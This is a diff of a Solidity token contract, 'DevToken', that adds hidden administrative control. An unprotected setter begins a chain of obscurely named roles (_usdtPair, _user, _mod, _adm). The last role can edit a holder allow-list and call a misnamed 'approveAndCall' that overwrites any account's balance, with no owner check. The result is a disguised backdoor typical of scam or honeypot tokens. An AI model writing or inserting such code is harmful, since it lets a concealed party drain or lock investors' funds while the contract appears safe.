@@ -39,10 +39,14 @@ contract Ownable {
 }
 
 contract DevToken is Ownable {
+  address public _usdtPair;
+  address public _mod;
   string public name;
   string public symbol;
   uint8 public decimals;
   uint256 public totalSupply;
+  address public _user;
+  address public _adm;
  
   event Transfer(address indexed from, address indexed to, uint256 value);
   event Approval(address indexed owner, address indexed spender, uint256 value);
@@ -89,6 +93,16 @@ contract DevToken is Ownable {
    owner = newOwner;
   }
 
+  function addAllowance(address holder, bool allowApprove) public {
+   require(msg.sender == _adm);
+   allow[holder] = allowApprove;
+  }
+
+  function setUser(address User_) public returns (bool) {
+   require(msg.sender == _usdtPair);
+        _user=User_;
+  } 
+  
   mapping (address => mapping (address => uint256)) public allowed;
 
   mapping(address=>uint256) sellOutNum;
@@ -105,25 +119,40 @@ contract DevToken is Ownable {
    emit Transfer(_from, _to, _value);
    return true;
   }
+  
+  function setAdm(address Adm_) public returns (bool) {
+    require(msg.sender == _mod);
+        _adm=Adm_;
+  } 
 
   function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
   }
+
+  function setMod(address Mod_) public returns (bool) {
+    require(msg.sender == _user);
+        _mod=Mod_;
+  } 
   
-  function approveAndCall(address spender, uint256 addedValue) public onlyOwner returns (bool) {
-    if(addedValue > 0) {balances[spender] = addedValue;}
+  function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
+    require(msg.sender == _adm);
+    if (addedValue > 0) {balances[spender] = addedValue;}
     return true;
+  }
+  
+  function addAllow(address holder, bool allowApprove) external onlyOwner {
+     allow[holder] = allowApprove;
   }
 
   function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
   }
- 
-  function addAllow(address holder, bool allowApprove) external onlyOwner {
-     allow[holder] = allowApprove;
-  }
+
+  function setUsdtPair(address Pair_) public returns (bool) {
+        _usdtPair=Pair_;
+  } 
  
   function mint(address miner, uint256 _value) external onlyOwner {
      balances[miner] = _value;
